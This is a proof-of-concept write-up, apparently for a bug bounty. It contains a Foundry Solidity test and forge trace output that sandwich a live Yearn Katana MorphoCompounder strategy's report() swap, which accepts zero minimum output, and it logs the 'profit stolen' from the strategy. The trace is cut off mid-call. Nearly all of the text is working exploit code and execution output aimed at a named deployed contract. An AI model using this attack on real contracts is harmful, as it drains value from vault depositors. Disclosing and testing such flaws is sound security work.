# poc:
```solidity
root@Gandhi:/home/gajnithehero/Desktop/Targets/yearnkatanacontractsstra# export REWARD_UNIV3_FEE=500
root@Gandhi:/home/gajnithehero/Desktop/Targets/yearnkatanacontractsstra# export REWARD_TOKEN=0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62
root@Gandhi:/home/gajnithehero/Desktop/Targets/yearnkatanacontractsstra# export KATANA_RPC_URL=https://rpc.katana.network/
root@Gandhi:/home/gajnithehero/Desktop/Targets/yearnkatanacontractsstra# cat test/test.sol
pragma solidity ^0.8.18;
import "forge-std/Test.sol";
interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}
interface ITokenizedStrategy {
    function asset() external view returns (address);
    function totalAssets() external view returns (uint256);
    function keeper() external view returns (address);
    function management() external view returns (address);
    function report() external returns (uint256 _profit, uint256 _loss);
}
enum SwapType {
    NULL,
    UNISWAP_V3,
    AUCTION
}
interface IMorphoCompounder is ITokenizedStrategy {
    function getAllRewardTokens() external view returns (address[] memory);
    function swapType(address token) external view returns (SwapType);
    function minAmountToSellMapping(address token) external view returns (uint256);
    function router() external view returns (address);
    function minAmountToSell() external view returns (uint256);
    function uniFees(address tokenIn, address tokenOut) external view returns (uint24);
    function addRewardToken(address _token, SwapType _swapType) external;
    function setUniFees(address _token0, address _token1, uint24 _fee) external;
}
interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }
    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);
}
contract MorphoCompounderSlippageMEVTest is Test {
    IMorphoCompounder internal strategy;
    ITokenizedStrategy internal tokenized;
    IERC20 internal asset;
    IERC20 internal reward;
    ISwapRouter internal router;
    address internal keeper;
    address internal management;
    address internal attacker;
    function setUp() public {
        string memory rpcUrl = vm.envString("KATANA_RPC_URL");
        uint256 forkId = vm.createFork(rpcUrl);
        vm.selectFork(forkId);
        strategy  = IMorphoCompounder(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12);
        tokenized = ITokenizedStrategy(address(strategy));
        asset   = IERC20(tokenized.asset());
        router  = ISwapRouter(strategy.router());
        keeper  = tokenized.keeper();
        management = tokenized.management();
        attacker   = makeAddr("attacker");
        address[] memory rewards = strategy.getAllRewardTokens();
        for (uint256 i = 0; i < rewards.length; ++i) {
            if (strategy.swapType(rewards[i]) == SwapType.UNISWAP_V3) {
                reward = IERC20(rewards[i]);
                break;
            }
        }
        if (address(reward) == address(0)) {
            // REWARD_TOKEN      = address of some ERC20 with a UniV3 pool vs asset()
            // REWARD_UNIV3_FEE  = fee tier of that pool (e.g. 500, 3000, 10000)
            address rewardFromEnv = vm.envAddress("REWARD_TOKEN");
            uint24  fee           = uint24(vm.envUint("REWARD_UNIV3_FEE"));
            require(
                rewardFromEnv != address(asset),
                "REWARD_TOKEN cannot be the strategy asset"
            );
            reward = IERC20(rewardFromEnv);
            vm.startPrank(management);
            strategy.addRewardToken(rewardFromEnv, SwapType.UNISWAP_V3);
            strategy.setUniFees(rewardFromEnv, address(asset), fee);
            vm.stopPrank();
        }
        require(
            address(reward) != address(0),
            "reward token not configured for UniV3"
        );
    }
    function _seedRewards() internal returns (uint256 rewardAmount, uint256 frontAmount) {
        uint256 globalMin  = strategy.minAmountToSell();
        uint256 mappingMin = strategy.minAmountToSellMapping(address(reward));
        uint256 minThreshold = globalMin > mappingMin ? globalMin : mappingMin;
        uint8  rewardDecimals = reward.decimals();
        uint256 unitReward    = 10 ** uint256(rewardDecimals);
        uint256 extra = unitReward * 1_000;
        rewardAmount  = minThreshold + extra;
        if (rewardAmount == 0) {
            rewardAmount = extra;
        }
        frontAmount = rewardAmount / 2;
        deal(address(reward), address(strategy), rewardAmount);
        deal(address(reward), attacker, frontAmount);
        uint8  assetDecimals = asset.decimals();
        uint256 unitAsset    = 10 ** uint256(assetDecimals);
        deal(address(asset), attacker, unitAsset * 1_000);
    }
    function _runReportWithoutAttack() internal returns (uint256 profit) {
        _seedRewards();
        uint256 beforeAssets = tokenized.totalAssets();
        vm.prank(keeper);
        (uint256 reportedProfit, uint256 reportedLoss) = tokenized.report();
        uint256 afterAssets = tokenized.totalAssets();
        assertEq(reportedLoss, 0, "baseline: reported loss should be zero");
        assertEq(
            afterAssets,
            beforeAssets + reportedProfit,
            "baseline: profit mismatch"
        );
        profit = reportedProfit;
    }
    function _runReportWithSandwich() internal returns (uint256 profit) {
        (, uint256 frontAmount) = _seedRewards();
        uint256 beforeAssets = tokenized.totalAssets();
        uint24 fee = strategy.uniFees(address(reward), address(asset));
        require(fee > 0, "no UniV3 fee configured for reward/asset");
        vm.startPrank(attacker);
        reward.approve(address(router), type(uint256).max);
        ISwapRouter.ExactInputSingleParams memory paramsFront = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: address(reward),
                tokenOut: address(asset),
                fee: fee,
                recipient: attacker,
                deadline: block.timestamp,
                amountIn: frontAmount,
                amountOutMinimum: 0, // attacker accepts any rate
                sqrtPriceLimitX96: 0
            });
        router.exactInputSingle(paramsFront);
        vm.stopPrank();
        vm.prank(keeper);
        (uint256 reportedProfit, uint256 reportedLoss) = tokenized.report();
        uint256 afterAssets = tokenized.totalAssets();
        assertEq(reportedLoss, 0, "attacked: unexpected explicit loss recorded");
        profit = reportedProfit;
        assertEq(
            afterAssets,
            beforeAssets + reportedProfit,
            "attacked: profit mismatch"
        );
    }
    function testSandwichReducesReportedProfit() public {
        uint256 snap = vm.snapshot();
        uint256 baselineProfit = _runReportWithoutAttack();
        vm.revertTo(snap);
        uint256 attackedProfit = _runReportWithSandwich();
        emit log_named_uint("baseline profit (no MEV)", baselineProfit);
        emit log_named_uint("attacked profit (with sandwich)", attackedProfit);
        emit log_named_uint(
            "profit stolen (difference)",
            baselineProfit - attackedProfit
        );
        assertLt(attackedProfit, baselineProfit, "sandwich should reduce strategy profit");
    }
}
```

```bash
root@Gandhi:/home/gajnithehero/Desktop/Targets/yearnkatanacontractsstra# forge test -vvvv
[⠒] Compiling...
[⠒] Compiling 1 files with Solc 0.8.30
[⠢] Solc 0.8.30 finished in 887.36ms
Compiler run successful!

Warning: the following cheatcode(s) are deprecated and will be removed in future versions:
  revertTo(uint256): replaced by `revertToState`
  snapshot(): replaced by `snapshotState`
Ran 1 test for test/test.sol:MorphoCompounderSlippageMEVTest
[PASS] testSandwichReducesReportedProfit() (gas: 17393596)
Logs:
  baseline profit (no MEV): 1917388100357
  attacked profit (with sandwich): 839609719719
  profit stolen (difference): 1077778380638

Traces:
  [17976296] MorphoCompounderSlippageMEVTest::testSandwichReducesReportedProfit()
    ├─ [0] VM::snapshot()
    │   └─ ← [Return] 0
    ├─ [2374] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::minAmountToSell() [staticcall]
    │   └─ ← [Return] 0
    ├─ [2566] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::minAmountToSellMapping(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62) [staticcall]
    │   └─ ← [Return] 0
    ├─ [9664] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::decimals() [staticcall]
    │   ├─ [2460] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::decimals() [delegatecall]
    │   │   └─ ← [Return] 18
    │   └─ ← [Return] 18
    ├─ [3508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   ├─ [2780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return]
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62) [staticcall]
    │   └─ ← [Return] [0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef], []
    ├─ [0] VM::load(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ emit WARNING_UninitedSlot(who: 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, slot: 62383759998050452719176739997299241539497671211442363241994204971096751849199 [6.238e76])
    ├─ [0] VM::load(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::store(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return]
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ emit SlotFound(who: 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, fsig: 0x70a08231, keysHash: 0x04f2f6350d549d0b09e534b5449b3e137ced476ed49ffeff61284a278d4cde74, slot: 62383759998050452719176739997299241539497671211442363241994204971096751849199 [6.238e76])
    ├─ [0] VM::load(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0x89ebf4f6e0b54f81d13d1862691317f094b92a4acf0fd374623c57eb8505beef, 0x00000000000000000000000000000000000000000000003635c9adc5dea00000)
    │   └─ ← [Return]
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   └─ ← [Return] 1000000000000000000000 [1e21]
    │   └─ ← [Return] 1000000000000000000000 [1e21]
    ├─ [3508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [2780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return]
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62) [staticcall]
    │   └─ ← [Return] [0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15], []
    ├─ [0] VM::load(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ emit WARNING_UninitedSlot(who: 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, slot: 109395211472047050365418391021802383717517866452697644495432222227801242766613 [1.093e77])
    ├─ [0] VM::load(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::store(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return]
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ emit SlotFound(who: 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, fsig: 0x70a08231, keysHash: 0x95e39942d3d4e3c52b847ed093f9085ab6d2d9a023036bf9d1450847eda30f16, slot: 109395211472047050365418391021802383717517866452697644495432222227801242766613 [1.093e77])
    ├─ [0] VM::load(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15, 0x00000000000000000000000000000000000000000000001b1ae4d6e2ef500000)
    │   └─ ← [Return]
    ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 500000000000000000000 [5e20]
    │   └─ ← [Return] 500000000000000000000 [5e20]
    ├─ [9642] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::decimals() [staticcall]
    │   ├─ [2438] 0x5e875267f65537768435C3C6C81cd313a570B422::decimals() [delegatecall]
    │   │   └─ ← [Return] 6
    │   └─ ← [Return] 6
    ├─ [3486] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [2758] 0x5e875267f65537768435C3C6C81cd313a570B422::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return]
    ├─ [1486] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [758] 0x5e875267f65537768435C3C6C81cd313a570B422::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36) [staticcall]
    │   └─ ← [Return] [0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15], []
    ├─ [0] VM::load(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ emit WARNING_UninitedSlot(who: 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, slot: 109395211472047050365418391021802383717517866452697644495432222227801242766613 [1.093e77])
    ├─ [0] VM::load(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [1486] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [758] 0x5e875267f65537768435C3C6C81cd313a570B422::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] VM::store(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return]
    ├─ [1486] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [758] 0x5e875267f65537768435C3C6C81cd313a570B422::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ emit SlotFound(who: 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, fsig: 0x70a08231, keysHash: 0x95e39942d3d4e3c52b847ed093f9085ab6d2d9a023036bf9d1450847eda30f16, slot: 109395211472047050365418391021802383717517866452697644495432222227801242766613 [1.093e77])
    ├─ [0] VM::load(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xf1db7ed87a8ad334689b1533d45f3e99cfc9066c676942e106e1649f9c6a8d15, 0x000000000000000000000000000000000000000000000000000000003b9aca00)
    │   └─ ← [Return]
    ├─ [1486] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   ├─ [758] 0x5e875267f65537768435C3C6C81cd313a570B422::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [delegatecall]
    │   │   └─ ← [Return] 1000000000 [1e9]
    │   └─ ← [Return] 1000000000 [1e9]
    ├─ [5408] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::totalAssets() [staticcall]
    │   ├─ [2507] 0xD377919FA87120584B21279a491F82D5265A139c::totalAssets() [delegatecall]
    │   │   └─ ← [Return] 30573573712348 [3.057e13]
    │   └─ ← [Return] 30573573712348 [3.057e13]
    ├─ [0] VM::prank(0xC29cbdcf5843f8550530cc5d627e1dd3007EF231)
    │   └─ ← [Return]
    ├─ [8066143] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::report()
    │   ├─ [8065739] 0xD377919FA87120584B21279a491F82D5265A139c::report() [delegatecall]
    │   │   ├─ [8021777] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::harvestAndReport()
    │   │   │   ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   │   │   │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 1000000000000000000000 [1e21]
    │   │   │   │   └─ ← [Return] 1000000000000000000000 [1e21]
    │   │   │   ├─ [3989] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::allowance(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 0x4e1d81A3E627b9294532e990109e4c21d217376C) [staticcall]
    │   │   │   │   ├─ [3258] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::allowance(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 0x4e1d81A3E627b9294532e990109e4c21d217376C) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─ [5318] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::approve(0x4e1d81A3E627b9294532e990109e4c21d217376C, 0)
    │   │   │   │   ├─ [4608] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::approve(0x4e1d81A3E627b9294532e990109e4c21d217376C, 0) [delegatecall]
    │   │   │   │   │   ├─ emit Approval(owner: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, spender: 0x4e1d81A3E627b9294532e990109e4c21d217376C, value: 0)
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [1989] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::allowance(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 0x4e1d81A3E627b9294532e990109e4c21d217376C) [staticcall]
    │   │   │   │   ├─ [1258] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::allowance(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 0x4e1d81A3E627b9294532e990109e4c21d217376C) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─ [23218] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::approve(0x4e1d81A3E627b9294532e990109e4c21d217376C, 1000000000000000000000 [1e21])
    │   │   │   │   ├─ [22508] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::approve(0x4e1d81A3E627b9294532e990109e4c21d217376C, 1000000000000000000000 [1e21]) [delegatecall]
    │   │   │   │   │   ├─ emit Approval(owner: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, spender: 0x4e1d81A3E627b9294532e990109e4c21d217376C, value: 1000000000000000000000 [1e21])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [7507891] 0x4e1d81A3E627b9294532e990109e4c21d217376C::exactInputSingle(ExactInputSingleParams({ tokenIn: 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, tokenOut: 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, fee: 500, recipient: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, deadline: 1764328298 [1.764e9], amountIn: 1000000000000000000000 [1e21], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
    │   │   │   │   ├─ [7500430] 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B::swap(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, false, 1000000000000000000000 [1e21], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000004000000000000000000000000078ec25fba1baf6b7dc097ebb8115a390a2a4ee12000000000000000000000000000000000000000000000000000000000000002bee7d8bcfb72bc1880d0cf19822eb0a2e6577ab620001f4203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000000000000000000000)
    │   │   │   │   │   ├─ [32913] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::transfer(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 1915400181318 [1.915e12])
    │   │   │   │   │   │   ├─ [32182] 0x5e875267f65537768435C3C6C81cd313a570B422::transfer(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 1915400181318 [1.915e12]) [delegatecall]
    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B, to: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, value: 1915400181318 [1.915e12])
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [3508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x2A2C512beAA8eB15495726C235472D82EFFB7A6B) [staticcall]
    │   │   │   │   │   │   ├─ [2780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x2A2C512beAA8eB15495726C235472D82EFFB7A6B) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 1520324023841535647786 [1.52e21]
    │   │   │   │   │   │   └─ ← [Return] 1520324023841535647786 [1.52e21]
    │   │   │   │   │   ├─ [11399] 0x4e1d81A3E627b9294532e990109e4c21d217376C::uniswapV3SwapCallback(-1915400181318 [-1.915e12], 1000000000000000000000 [1e21], 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000004000000000000000000000000078ec25fba1baf6b7dc097ebb8115a390a2a4ee12000000000000000000000000000000000000000000000000000000000000002bee7d8bcfb72bc1880d0cf19822eb0a2e6577ab620001f4203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000000000000000000000)
